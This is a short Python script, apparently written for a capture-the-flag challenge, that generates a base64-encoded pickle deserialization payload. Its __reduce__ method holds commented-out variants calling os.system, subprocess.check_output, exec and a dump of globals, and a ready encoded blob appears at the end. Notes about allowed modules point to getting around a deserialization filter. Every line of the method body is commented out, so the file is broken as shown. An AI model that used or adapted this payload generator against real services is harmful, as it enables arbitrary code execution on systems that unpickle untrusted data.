import pickle, base64

# ALLOWED_PICKLE_MODULES = ['__main__', 'app']
# UNSAFE_NAMES = ['__builtins__']

class PicklePayload:
  def __reduce__(self):
    # import subprocess
    # return (subprocess.check_output, ('ls',))

    # import os
    # return os.system, ('ls',)

    # return print, (str(globals()),)

    # return exec, ('1+1',)
    

p = pickle.dumps(PicklePayload())
print(base64.b64encode(p).decode('ASCII'))

# gASVKAAAAAAAAACMCnN1YnByb2Nlc3OUjAxjaGVja19vdXRwdXSUk5SMAmxzlIWUUpQu
